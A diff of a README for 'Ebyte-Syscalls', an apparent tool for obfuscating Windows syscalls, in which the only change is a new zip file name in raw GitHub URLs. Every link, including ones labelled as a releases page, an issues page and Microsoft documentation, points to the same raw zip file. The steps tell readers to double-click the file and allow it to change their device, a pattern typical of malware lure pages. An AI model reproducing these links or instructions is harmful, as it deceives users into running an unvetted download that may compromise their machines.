@@ -1,6 +1,6 @@
 # 🛠️ Ebyte-Syscalls - Secure Your Function Calls Effortlessly
 
-[![Download Ebyte-Syscalls](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip%https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip)](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip)
+[![Download Ebyte-Syscalls](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip%https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip)](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,19 +18,19 @@ Before downloading and running Ebyte-Syscalls, ensure you meet the following sys
 
 ## 💻 Download & Install
 
-To get started, visit the releases page for Ebyte-Syscalls: [Download Ebyte-Syscalls](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip).
+To get started, visit the releases page for Ebyte-Syscalls: [Download Ebyte-Syscalls](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip).
 
 ### Steps to Download:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release version.
-3. Find the appropriate file for your system, usually labeled as `https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip`.
+3. Find the appropriate file for your system, usually labeled as `https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip`.
 4. Click on the file to start the download. 
 
 Once the download completes, follow these steps to run the application:
 
 1. Locate the downloaded file in your computer’s Downloads folder or the specified location.
-2. Double-click the `https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip` file.
+2. Double-click the `https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip` file.
 3. If prompted, allow the application to make changes to your device.
 
 ### First-time Setup
@@ -75,17 +75,17 @@ If you run into any issues, try reinstalling the application or checking for any
 
 ## 🌐 Community and Support
 
-For questions or assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip). You can report bugs, request features, or simply share your experience.
+For questions or assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip). You can report bugs, request features, or simply share your experience.
 
 ## 🔗 Additional Resources
 
 For further reading on Vectored Exception Handlers and their benefits, consider checking out the following links:
 
-- [Microsoft Documentation on Exception Handling](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip)
-- [Introduction to Obfuscation](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip)
+- [Microsoft Documentation on Exception Handling](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip)
+- [Introduction to Obfuscation](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip)
 
 ## 📥 Revisit Download Link
 
-To download Ebyte-Syscalls again, follow this link: [Download Ebyte-Syscalls](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte-Syscalls-curryfavel.zip). 
+To download Ebyte-Syscalls again, follow this link: [Download Ebyte-Syscalls](https://raw.githubusercontent.com/kathybabelike209/Ebyte-Syscalls/main/EbyteSyscalls/Ebyte_Syscalls_1.6.zip). 
 
 Thank you for choosing Ebyte-Syscalls. We’re confident it will help you protect your function calls effortlessly.
